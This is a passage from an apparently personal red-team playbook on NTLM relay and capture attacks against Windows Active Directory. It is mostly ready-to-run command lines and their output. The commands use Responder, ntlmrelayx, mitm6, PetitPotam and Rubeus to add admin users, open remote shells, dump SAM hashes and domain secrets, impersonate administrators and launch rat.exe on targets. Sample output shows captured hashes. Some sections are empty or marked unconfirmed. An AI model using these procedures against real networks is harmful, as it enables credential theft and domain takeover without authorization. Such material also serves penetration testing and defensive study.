			* [https://twitter.com/mpgn_x64/status/1453018750253424643](https://twitter.com/mpgn_x64/status/1453018750253424643)
		* <details><summary>Requirements (Click to expand)</summary><p>
			*
		* <details><summary>NOTES (Click to expand)</summary><p>
			* Module for CME is described as "not opsec friendly"
			* You do NOT need CME to perform the LNK file attack.
		* Process
			1. Identify writeable share

					crackmapexec smb <target> -u <username> -p <password> --shares
			1. Initiate Responder or ntlmrelayx according to desired attack.
				* Responder: Downgrade Attack (if applicable)
					* Configure custom challenge to be `1122334455667788`
					* Once authentication is captured, if successfully downgraded, use `crack.sh`
					
						python Responder.py -I <interface> --disable-ess
				* ntlmrelayx.py
					
						python examples/ntlmrelayx.py -t <target>
			1. Place LNK file on identified writeable share

					crackmapexec smb <target> -u <username> -p <password> -M slinky -o NAME=<writeable_sharename> SERVER=<Responder_Server_IP>
			1. Wait for capturred authentication. Complete capture/relay process
			1. Cleanup LNK file
				* Crackmapexec
					
						crackmapexec smb <target> -u <username> -p <password> -M slinky -o NAME=<writeable_sharename> SERVER=<Responder_Server_IP> CLEANUP=True
	* <details><summary>RPC Relay Attack (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/nullenc0de/status/1266214434755743745](https://twitter.com/nullenc0de/status/1266214434755743745)
			* [https://blog.compass-security.com/2021/08/relaying-ntlm-authentication-over-rpc-again/](https://blog.compass-security.com/2021/08/relaying-ntlm-authentication-over-rpc-again/)
				* "[https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26414](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26414) Microsoft released a fix as part of the Update Tuesday in June 2021. The solution implemented adds integrity requirement for the DCOM Service. It still does not fix the lack of global integrity requirement for RPC, but renders one big vector of attacks impossible."
		* Process
			1. Target RPC

					http://ntlmrelayx.py -ip 0.0.0.0 -t rpc://<target_fqdn> -c "net user <username> <password> /add && net localgroup Administrators <username> /add"
				* Don't really need to set the v6 flag if you're targeting a v4 host.
			1. Coerce Authentication

					mitm6 -i <interface> -d <domain.tld>
	* <details><summary>WebDAV/Rubeus (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
		* <details><summary>Requirements (Click to expand)</summary><p>
			* WebDAV Service Initiated on target
		* Process
			1. Initiate ntlmrelayx authentication

					ntlmrelayx.py -t ldaps://<dc_hostname> --delegate-access --no-smb-server -wh attacker-wpad-no-dump --no-da --no-acl --no-validate-privs
			1. Trigger Authentication
				* PetitPotam
					
						PetitPotam.exe <attacker_hostname>@80/a.txt 192.168.38.104
				* PrintSpooler
					
						SpoolSample.exe 192.168.38.104 <attacker_hostname>@80/asdf
			1. Calculate Password Hash
					* Windows
						
							Rubeus.exe hash /password:NkQuBzsPk_AqKC6 /user:ZESLUQVX$ /domain:windomain.local
			1. Perform impersonation via S4U2Proxy
				* Windows
					
						Rubeus.exe s4u /user:ZESLUQVX$ /rc4:D57DFD6E3BCDB1C2BF4D02CEE32F58C3 /impersonateuser:Administrator /msdsspn:cifs/WIN10.WINDOMAIN.LOCAL /ptt
	* <details><summary>SMB Relay with CME (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
		* <details><summary>Requirements (Click to expand)</summary><p>
		* Process
			1. Enumerate systems missing SMB Signing with Crackmapexec

					crackmapexec smb <subnet> --gen-relay-list relay-list.txt
			1. Install proxychains and configure the proxy setting to be for port `1080`.
			1. Initiate NTLMRelayx. Include the proxy setting. Set Targets File to the generated relay list, or a subset if that list is long.

					python examples/ntlmrelayx.py -socks -tf relay-list.txt -smb2support
			1. Place malicious LNK file on file share (or somewhere where local admins will generate authentication)
			1. Receive authentication, and confirm that the captured user authentication has local administrator rights on targets
				* NOTE: For as long as you have 'received' this authentication, the blue team can see persistent connections to your attacker box. Continue with the steps and be ready to kill your ntlmrelay afterwards.
			1. Use crackmapexec (which uses `secretsdump.py`) to dump credentials with relayed authentication for targets where the user is a local administrator.

					proxychains crackmapexec smb <target> -u '' -p '' -d $DOMAIN
			1. As soon as the above is completed, terminate the ntlmrelayx script.
			1. Review credentials captured by crackmapexec in CMEDB.

					cmedb
					smb
					creds
					creds <a string representing creds --> search>
			1. Authenticate to systems using the credentials captured by crackmaexec

					crackmapexec smb <target> -id <cred ID(s)>
	* <details><summary>Forced auth + RBCD + dump creds (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
		* <details><summary>Requirements (Click to expand)</summary><p>
			*
		* Process
			1. Enumerate vulnerable systems
			1. Initiate ntlmrelayx
				* The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
			
			1. Pass the ticket
				
					export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
			1. Dump credentials						
			
					secretsdump.py -k -no-pass second-dc-server.local -just-dc	
			* Process
				1. To get the `--delegate-access` working correctly, may need to make the following modifications to `targetsutils.py` (`impacket/impacket/examples/ntlmrelayx/utils`), Comment out line 136 and change 141 from .pop() to [0] - also see ["issue914"](https://github.com/SecureAuthCorp/impacket/issues/914):

						136            #            self.generalCandidates.remove(target)
						137                        return target
						138                LOG.debug("No more targets for user %s" % identity)
						139               return None
						140            else:
						141                return self.generalCandidates[0]
				1. Run relaying tool

						ntlmrelayx.py -t ldaps://<dc_hostname> --delegate-access --no-smb-server -wh <attacker-wpad-no-dump> --no-da --no-acl --no-validate-privs
				1. Convert new machine account access to Kerberos Access
					
						getST.py -spn cifs/WIN10X64.$DOMAIN $DOMAIN/GCTCRVBY\$ -impersonate <local_administrator>
				1. Dump credentials
					
						export KRB5CCNAME=administrator.ccache
						secretsdump.py -k -no-pass win10x64.mcafeelab.local
	* <details><summary>RemotePotato0 DCOM DCE RPC relay (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			*
		* <details><summary>Requirements (Click to expand)</summary><p>
			*
		* Process
		* Requirements
		    * a shell in session 0 (e.g. WinRM shell or SSH shell)
		    * a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
		* Tool link -<br />[https://github.com/antonioCoco/RemotePotato0/](https://github.com/antonioCoco/RemotePotato0/)
		* Modified ntlmrelayx -<br />https://shenaniganslabs.io/files/impacket-ghostpotato.zip

				ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
	    * It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
		1. Initialize socat

				sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
		1. Initialize the modified ntlmrelay

				sudo ntlmrelayx.py -t ldap://<target_IP> --no-wcf-server --escalate-user winrm_user_1
		1. Launch the RemotePotato0 binary from the Windows Session.

				RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
		1. Launch a shell connection

				psexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
	* <details><summary>Ghost Potato - CVE-2019-1384 (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* Tool Link -<br />[https://shenaniganslabs.io/files/impacket-ghostpotato.zip](https://shenaniganslabs.io/files/impacket-ghostpotato.zip)
		* <details><summary>Requirements (Click to expand)</summary><p>
		    * User must be a member of the local Administrators group
		    * User must be a member of the Backup Operators group
		    * Token must be elevated
		* Process
			1. Launch with modified ntlmrelayx

					ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
			1. Launch the file on the target computer.
	* <details><summary>ZeroLogon Relay</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			*
		* <details><summary>Requirements (Click to expand)</summary><p>
			*
		* Process
			1. Intiate ntlmrelayx.py with DCSYNC targeting.

					python examples/ntlmrelayx.py -t DCSYNC:://<dc01_vuln2coercion_FQDN> -smb2support
			1. Force Authentication

					python printerbug.py $DOMAIN/$DOMAIN_USER:$PASSWORD@<dc2_vuln2ZeroLogon_FQDN> $LOCAL_IP
			* https://dirkjanm.io/a-different-way-of-abusing-zerologon/
			* DCSync uses DRSUAPI which always requires signing (not configurable unlike SMB signing), so unless you have the actual password of the account or the server is vulnerable to zerologon, you can't relay to it.
			* "If you have the credentials of a low-privilege account, you can connect over SMB and obtain all the hashes:"

					ntlmrelayx.py -t DCSYNC://domain_controller -smb2support -auth-smb domain/low_priv_user:password
	* <details><summary>PrivExchange #1 (Patched February 12th, 2019) (Click to expand)</summary><p>
		* <details><summary>Resources (Click to expand)</summary><p>
			* [https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
			* Resource: https://github.com/dirkjanm/PrivExchange
		* <details><summary>Requirements (Click to expand)</summary><p>
			*
		* Process
			1. Initiate ntlmrelayx

					ntlmrelayx.py -t ldap://<dc_fqdn> --escalate-user <username>
			1. Force Auth with privexchange python script (NOTE: Password is requested after this command)

					python privexchange.py -ah <fqdn_for_attacker_URL> <exchange_FQDN>
			* Alternatively, if you coerce user auth for creds, you can modify httpattack.py to match Dirkjanm and coerce creds in environment otherwise:

					ntlmrelayx.py -t https://<exchange_server_FQDN>/EQS/Exchange.asmx
	* <details><summary>NEEDS CONFIRM: No Creds --> Some Creds --> Multirelay: Downgrade + Relay (Click to expand)</summary><p>
		* <details><summary>Resources/References (Inspiration, but not direct match of attack) (Click to expand)</summary><p>
			* Twitter
				* Tweet: [https://twitter.com/an0n_r0/status/1432097564518649861](https://twitter.com/an0n_r0/status/1432097564518649861)
				* Referenced 'HQ' Video: [https://streamable.com/dzdmfb](https://streamable.com/dzdmfb)
		* Process
			* Attack
				1. Initiate ntlmrelayx, prepared to capture authentication. Target DC vulnerable to petitpotam/printspooler.
					
						python examples/ntlmrelayx.py -ip <attacker-ip> -t <target-to-attack> -socks -smb2support --no-http-server --no-wcf-server
				1. Coerce/Force machine account authentication (theory: any computer, but may want SMB signing disabled)
					
						mitm6 -hw <host_whitelist.txt> -i <interface>
				1. Submit command to stop servers in the ntlmrelayx panel window (may not appear like you can type, but if you used `-socks`, you can)

						stopservers
				1. Initiate Responder with a downgrade attack prepared.

						python Responder.py -I eth0 --lm -v
				1. Initiate second ntlmrelayx with `-socks`, again. Now, target where DC creds will go. If
					
						python examples/ntlmrelayx.py -ip <attacker-ip> -tf <targets,-to-attack> -socks -smb2support --no-http-server --no-wcf-server -ntlmchallenge "1122334455667788"
					* Specify your prefered targets in a list, but include the responder IP/port (prefix `smb://`). Any attacks you relay will relay to responder to test for downgrade, too.
				1. Launch PetitPotam with proxychains (modified to ntlmrelay port) using captured credentials. Specify the username captured in username parameter.
					
						proxychains python petitpotam.py -u <machine_username,escape_the_\$> -p '' <attacker_ip> <target_name_1>
					* Specify a blank password
					* Machine accounts needs to escape the `$`.
				1. Observe within ntlmrelayx that the authentication is not administrator.


## Attack Guide. Build your own attack.
### From a Linux Machine
1. Enumerate
	* Systems with WebClientService/WebDEV Running
		* [SMB Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-3_SMB_Enumeration.md)
	* Systems Missing SMB Signing (To relay to SMB)
		* [SMB Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-3_SMB_Enumeration.md)
	* Systems vulnerable to disabling LDAP Signing ("Drop the MIC")
		* [SMB Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-3_SMB_Enumeration.md)
	* Opportunities for forced/coerced authentication
		* [RPC Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-4_RPC_Enumeration.md)
		* [SMB Enumeration Guide](Testaments_and_Books/Redvelations/Active_Directory/001-3_SMB_Enumeration.md)
		* [Forced Authentication Guide](Testaments_and_Books/Redvelations/Active_Directory/003-3_AD_Forced_Authentication.md)
1. Initiate auth. relaying/capturing tool ([Adversary-in-the-Middle TTP](TTP/T1557_Adversary-in-the-Middle/T1557.md))
	* Relay
		* To HTTP/S
			* To ADCS (HTTP)
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>

						ntlmrelayx.py -t https://<certificate-server-name>/certsrv/certfnsh.asp -smb2support --adcs --template "DomainController"
					* `--adcs` - enables ADCS attack
					* `--template` - Specifies template for use. Include within `"`.
						* <details><summary>Template Tips (Click to expand)</summary><p>
							* `"DomainController"` - usually works for Domain Controllers, but other templates (Kerberos-Something?) can also be used to get intended the high level access
							* Templates can be entirely custom, so enumeration helps
							* User auth relay should match to the template and can still provide escalation
			* Any web app. with NTLM auth? Untested across any variety
		* To SMB
			* Execute specific file or command on target
				* <details><summary>ntlmrelay (Click to expand)</summary><p>
					* `-c` for command/payload
					* Examples
						* Example 1: Specific Command

								ntlmrelayx.py -t $TARGET -smb2support -c 'whoami'
							* Example Output

									root@jack-Virtual-Machine:~/impacket# ntlmrelayx.py -t $TARGET -smb2support -c 'whoami'
									Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

									[*] Protocol Client IMAP loaded..
									[*] Protocol Client IMAPS loaded..
									[*] Protocol Client LDAPS loaded..
									[*] Protocol Client LDAP loaded..
									[*] Protocol Client HTTPS loaded..
									[*] Protocol Client HTTP loaded..
									[*] Protocol Client MSSQL loaded..
									[*] Protocol Client SMB loaded..
									[*] Protocol Client RPC loaded..
									[*] Protocol Client DCSYNC loaded..
									[*] Protocol Client SMTP loaded..
									[*] Running in relay mode to single host
									[*] Setting up SMB Server
									[*] Setting up HTTP Server on port 80
									[*] Setting up WCF Server
									[*] Setting up RAW Server on port 6666

									[*] Servers started, waiting for connections
									[*] SMBD-Thread-5: Received connection from 10.0.0.101, attacking target smb://ca.microsoftdelivery.com
									[*] Authenticating against smb://ca.microsoftdelivery.com as MICROSOFTDELIVE/DOMAIN_ADMIN SUCCEED
									[*] SMBD-Thread-7: Connection from 10.0.0.101 controlled, but there are no more targets left!
									[*] SMBD-Thread-8: Connection from 10.0.0.101 controlled, but there are no more targets left!
									[*] SMBD-Thread-9: Connection from 10.0.0.101 controlled, but there are no more targets left!
									[*] SMBD-Thread-10: Connection from 10.0.0.101 controlled, but there are no more targets left!
									[*] Service RemoteRegistry is in stopped state
									[*] Starting service RemoteRegistry
									[*] Executed specified command on host: ca.microsoftdelivery.com
									nt authority\system

									[*] Stopping service RemoteRegistry
						* Example 2: Specific File (not yet working in testing)

								ntlmrelayx.py -t $TARGET -smb2support -e $WORKINGDIR/file
			* Reverse Shell
				* <details><summary>ntlmrelay (Click to expand)</summary><p>
					* Examples
						* Example 1
							1. Initiate ntlmrelay and intercept authentication

									ntlmrelayx.py -t $TARGET -smb2support -i
								* Example Output: ntlmrelay

										root@jack-Virtual-Machine:~/impacket# ntlmrelayx.py -t $TARGET -smb2support -i
										Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

										[*] Protocol Client IMAPS loaded..
										[*] Protocol Client IMAP loaded..
										[*] Protocol Client LDAP loaded..
										[*] Protocol Client LDAPS loaded..
										[*] Protocol Client HTTPS loaded..
										[*] Protocol Client HTTP loaded..
										[*] Protocol Client MSSQL loaded..
										[*] Protocol Client SMB loaded..
										[*] Protocol Client RPC loaded..
										[*] Protocol Client DCSYNC loaded..
										[*] Protocol Client SMTP loaded..
										[*] Running in relay mode to single host
										[*] Setting up SMB Server
										[*] Setting up HTTP Server on port 80
										[*] Setting up WCF Server
										[*] Setting up RAW Server on port 6666

										[*] Servers started, waiting for connections
										[*] SMBD-Thread-5: Received connection from 10.0.0.101, attacking target smb://ca.microsoftdelivery.com
										[*] Authenticating against smb://ca.microsoftdelivery.com as MICROSOFTDELIVE/DOMAIN_ADMIN SUCCEED
										[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
							1. Run netcat to utilize the interactive session
								* Example Output: running netcat

										root@jack-Virtual-Machine:~/Responder# nc 127.0.0.1 11000
										Type help for list of commands
										# shares
										ADMIN$
										C$
										CertEnroll
										IPC$
										Users
				* <details><summary>Multirelay (Click to expand)</summary><p>

						python MultiRelay.py -t $TARGET -u ALL
				* C2 (See C2 guides)
			* Dump Credentials
				* <details><summary>Requirements (Click to expand)</summary><p>
					* Local Administrator Privilege
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* Overview
						* ntlmrelayx dumps credentials by default using impacket's `secretsdump.py`
						* Script assumes `secretsdump.py` is in the same folder. You can specify the file location with `-e` if needed.
						* `-socks` option can be used with compatible tools for memory dumping
						* `crackmapexec` makes use of `secretsdump.py` but stores output to `cmedb`, which can be quite functional
					* Examples
						* Example 1

								ntlmrelayx.py -tf $WORKINGDIR/relay-list.txt -smb2support
							* Example Output

									root@jack-Virtual-Machine:~/impacket# ntlmrelayx.py -tf relay-list -smb2support
									Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

									[*] Protocol Client IMAP loaded..
									[*] Protocol Client IMAPS loaded..
									[*] Protocol Client LDAP loaded..
									[*] Protocol Client LDAPS loaded..
									[*] Protocol Client HTTP loaded..
									[*] Protocol Client HTTPS loaded..
									[*] Protocol Client MSSQL loaded..
									[*] Protocol Client SMB loaded..
									[*] Protocol Client RPC loaded..
									[*] Protocol Client DCSYNC loaded..
									[*] Protocol Client SMTP loaded..
									[*] Running in relay mode to hosts in targetfile
									[*] Setting up SMB Server
									[*] Setting up HTTP Server on port 80
									[*] Setting up WCF Server
									[*] Setting up RAW Server on port 6666

									[*] Servers started, waiting for connections
									[*] SMBD-Thread-5: Connection from MICROSOFTDELIVE/TEST@10.0.0.101 controlled, attacking target smb://10.0.0.101
									[-] Authenticating against smb://10.0.0.101 as MICROSOFTDELIVE/TEST FAILED
									[*] SMBD-Thread-6: Connection from MICROSOFTDELIVE/DOMAIN_ADMIN@10.0.0.101 controlled, attacking target smb://10.0.0.3
									[*] Authenticating against smb://10.0.0.3 as MICROSOFTDELIVE/DOMAIN_ADMIN SUCCEED
									[*] SMBD-Thread-6: Connection from MICROSOFTDELIVE/DOMAIN_ADMIN@10.0.0.101 controlled, attacking target smb://10.0.0.101
									[-] Authenticating against smb://10.0.0.101 as MICROSOFTDELIVE/DOMAIN_ADMIN FAILED
									[*] Service RemoteRegistry is in stopped state
									[*] Starting service RemoteRegistry
									[*] Target system bootKey: 0x60bac63614b569c3a9554f4d8827e735
									[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
									Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
									Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
									DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
									WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c11d5d34c5a505df4e476fd56a01542f:::
									[*] Done dumping SAM hashes for host: 10.0.0.3
									[*] Stopping service RemoteRegistry
			* Zerologon Abuse (DCSync)
				* <details><summary>ntlmrelay (Click to expand)</summary><p>
					* Note: Unable to make this work on unpatched server 2019 targets in lab.
					* Examples
						* Example 1: Dump domain controller secrets only
							
								ntlmrelayx.py -t dcsync://$DOMAIN_CONTROLLER
						* Example 2: Dump Domain's secrets
							
								ntlmrelayx.py -t dcsync://$DOMAIN_CONTROLLER -auth-smb $DOMAIN/$DOMAIN_USER:$PASSWORD
			* Enumerate Local Administrator Accounts
				* <details><summary>ntlmrelay (Click to expand)</summary><p>
					* Examples
						* Example 1: Dump domain controller secrets only

								ntlmrelayx.py -t $TARGET --enum-local-admins
							* Example Output

									.
		* To LDAP (excludes RBCD)
			* <details><summary>Overview, Requirements (Click to expand)</summary><p>
				* NEEDS CONFIRM: Any attacks performed in LDAP can just the same be performed over LDAPS
			* Dump Broad LDAP Information
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* Example

							ntlmrelayx.py --no-acl --no-da --no-validate-privs -t ldap://$DOMAIN_CONTROLLER
						* Example Output

								root@jack-Virtual-Machine:~# ntlmrelayx.py --no-acl --no-da --no-validate-privs -t ldap://$
								DOMAIN_CONTROLLER
								Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

								[*] Protocol Client IMAPS loaded..
								[*] Protocol Client IMAP loaded..
								[*] Protocol Client LDAP loaded..
								[*] Protocol Client LDAPS loaded..
								[*] Protocol Client HTTPS loaded..
								[*] Protocol Client HTTP loaded..
								[*] Protocol Client MSSQL loaded..
								[*] Protocol Client SMB loaded..
								[*] Protocol Client RPC loaded..
								[*] Protocol Client DCSYNC loaded..
								[*] Protocol Client SMTP loaded..
								[*] Running in relay mode to single host
								[*] Setting up SMB Server
								[*] Setting up HTTP Server on port 80
								[*] Setting up WCF Server
								[*] Setting up RAW Server on port 6666

								[*] Servers started, waiting for connections
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, attacking target ldap://dc01.microsoftdelivery.com
								[*] HTTPD(80): Authenticating against ldap://dc01.microsoftdelivery.com as / SUCCEED
								[*] Assuming relayed user has privileges to escalate a user via ACL attack
								[*] Dumping domain info for first time
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, but there are no more targets left!
								[*] Domain info dumped into lootdir!
			* Shadow Credentials Relay Attack
				* Manipulate the `msDS-KeyCredentialLink` attribute of a target user/computer to obtain full control over that object.
				* <details><summary>Requirements (Click to expand)</summary><p>
					* Domain Functional Level Windows Server 2016+ (Necessary PKINIT features were introduced with Windows Server 2016)
					* Domain must have 1+ DC running Windows Server 2016 or above
					* The targeted DC must have its own certificate + keys (the organization must have something such as AD CS, PKI, a CA, etc.)
						* Required because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction.
						* A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` will be raised if requirement not met
					* The attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account
				* <details><summary>ntlmrelayx [https://github.com/SecureAuthCorp/impacket/pull/1132](https://github.com/SecureAuthCorp/impacket/pull/1132) (resources: [https://github.com/ShutdownRepo/pyWhisker](https://github.com/ShutdownRepo/pyWhisker)) (Click to expand)</summary><p>
					* `--shadow-credentials` - Enable Shadow Credentials relay attack
					* `--shadow-target` - "target account (user or computer$) to populate msDS-KeyCredentialLink from"
					* `--pfx-password` - "password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)"
					* `--export-type` - "choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))"
					* `--cert-outfile-path` - "filename to store the generated self-signed PEM or PFX certificate and key"
			* Account Creation for future use
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* `--add-computer` flag
			* Enumerate LDAP
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
			* Privesc to DA
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* `-t` should be `ldap://<dc_hostname`
					* ntlmrelayx checks for this by default with ldap
						* Consequently, this slows down other attacks and is usually recommended to be disabled if trying the other attacks
			* Custom ntlmrelayx + exploits
				* <details><summary>RemotePotato0, Ghost Potato (Click to expand)</summary><p>
					* Modified ntlmrelayx -<br />[https://shenaniganslabs.io/files/impacket-ghostpotato.zip](https://shenaniganslabs.io/files/impacket-ghostpotato.zip)
					1. Initialize socat
						
							sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
							
								ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
					1. Initialize the modified ntlmrelay
						
							sudo ntlmrelayx.py -t ldap://<target_IP> --no-wcf-server --escalate-user winrm_user_1
		* To LDAPS
			* <details><summary>Overview, Requirements (Click to expand)</summary><p>
				* Required for sensitive functions (new account creation)
				* Not default
				* LDAP/S signing must not be enabled
					* "Drop the MIC" bypasses LDAP signing, if vulnerable
				* Request a new Machine Account with Local Admin rights to the relayed account ([`Create Account - Domain Account` TTP](TTP/T1136_Create_Account/002_Domain_Account/T1136.002.md))
				* Requires a relayed Machine Account authentication
			* Dump Broad LDAP Information
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* Example

							ntlmrelayx.py --no-acl --no-da --no-validate-privs -t ldaps://$DOMAIN_CONTROLLER
						* Example Output

								root@jack-Virtual-Machine:~# ntlmrelayx.py --no-acl --no-da --no-validate-privs -t ldaps://$DOMAIN_CONTROLLER
								Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

								[*] Protocol Client IMAP loaded..
								[*] Protocol Client IMAPS loaded..
								[*] Protocol Client LDAP loaded..
								[*] Protocol Client LDAPS loaded..
								[*] Protocol Client HTTPS loaded..
								[*] Protocol Client HTTP loaded..
								[*] Protocol Client MSSQL loaded..
								[*] Protocol Client SMB loaded..
								[*] Protocol Client RPC loaded..
								[*] Protocol Client DCSYNC loaded..
								[*] Protocol Client SMTP loaded..
								[*] Running in relay mode to single host
								[*] Setting up SMB Server
								[*] Setting up HTTP Server on port 80
								[*] Setting up WCF Server
								[*] Setting up RAW Server on port 6666

								[*] Servers started, waiting for connections
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, attacking target ldaps://dc01.microsoftdelivery.com
								[*] HTTPD(80): Authenticating against ldaps://dc01.microsoftdelivery.com as / SUCCEED
								[*] Assuming relayed user has privileges to escalate a user via ACL attack
								[*] Dumping domain info for first time
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, but there are no more targets left!
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, but there are no more targets left!
								[*] HTTPD(80): Connection from 10.0.0.101 controlled, but there are no more targets left!
								[*] Domain info dumped into lootdir!

			* Escalate User
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* Examples
						* Example 1

							ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --escalate-user SHUTDOWN
			* Create RBCD Abuse Opportunity
				* Note: The relay must target LDAPS in cases where the computer account is not already compromised.
				* <details><summary>ntlmrelayx (Click to expand)</summary><p>
					* Examples
						* Example 1: Specify compromised computer account name that you have control over.

								ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --delegate-access --escalate-user $COMPUTER_ACCOUNT
						* Example 2: Specify the creation of a new computer account name (requires LDAPS)

								ntlmrelayx.py -t ldaps://$DOMAIN_CONTROLLER --delegate-access --add-computer
		* <details><summary>SPECIAL: ntlmrelayx proxy technique (Click to expand)</summary><p>
			* <details><summary>How the re-authentication works (Click to expand)</summary><p>
					* "If we have a target that matches the user we picked before, we force re-authentication. To do this, we send a TreeConnect response with the status field: `STATUS_NETWORK_SESSION_EXPIRED`" -<br />[https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/](https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/)
			* Examples
				* Example 1

						ntlmrelayx.py -tf <list_of_targets.txt> -socks -smb2support
					* <details><summary>Example Output (Click to expand)</summary><p>

							ntlmrelayx.py -tf /tmp/targets.txt -socks -smb2support
							[*] Servers started, waiting for connections
							Type help for list of commands
							ntlmrelayx> socks
							Protocol  Target          Username                  Port
							--------  --------------  ------------------------  ----
							MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
							SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
							MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433
					* Use `proxychains` over port 1080 to provide auth. for compatible tools
					* `-socks` option for ntlmrelayx allows ntlmrelayx to 'suspend' an auth for later user
	* Capture
		* Basic Capturing
			* <details><summary>Responder (Click to expand)</summary><p>

					python Responder.py -I <interface>
			* <details><summary>impacket's smbserver.py (Click to expand)</summary><p>		

					python smbserver.py
		* WebDAV - Force Basic Auth
			* <details><summary>Responder (Click to expand)</summary><p>

					python Responder.py -I <interface> -b
				* `-b` - force WebDAV browser to use basic authentication (plaintext creds)
		* Downgrade Attack
			* <details><summary>Overview (Click to expand)</summary><p>
				* This is the challenge set by the `crack.sh` website/database.
				* In environments missing a stealth patch applied in Mid-2021 (August?), this works by default
				* Silent patch in 2021.09 to fix the "works by default" impact
			* Force LM Authentication
				* <details><summary>Requirements (Click to expand)</summary><p>
					* In environments missing a stealth patch applied in Mid-2021 (August?), this works by default
						* Silent patch in 2021.09 to fix the "works by default" impact
				* <details><summary>Responder (Click to expand)</summary><p>
					* Option 2: `--lm`

							python Responder.py -I $NETWORK_INTERFACE --lm
						* Example Output

								[+] Poisoning Options:                                      
								    Analyze Mode               [OFF]
								    Force WPAD auth            [OFF]
								    Force Basic Auth           [OFF]
								    Force LM downgrade         [OFF]
								    Force ESS downgrade        [ON]
								    Fingerprint hosts          [OFF]

								[+] Generic Options:                                        
								    Responder NIC              [ens33]
								    Responder IP               [10.0.0.22]
								    Challenge set              [1122334455667788]
								    Don't Respond To Names     ['ISATAP']

								[+] Current Session Variables:                              
								    Responder Machine Name     [WIN-S9VM0RELOJH]
								    Responder Domain Name      [G7JM.LOCAL]
								    Responder DCE-RPC Port     [45397]

								[+] Listening for events...                                 

								[SMB] NTLMv1-SSP Client   : 10.0.0.1
								[SMB] NTLMv1-SSP Username : SECURELAB\DC01$
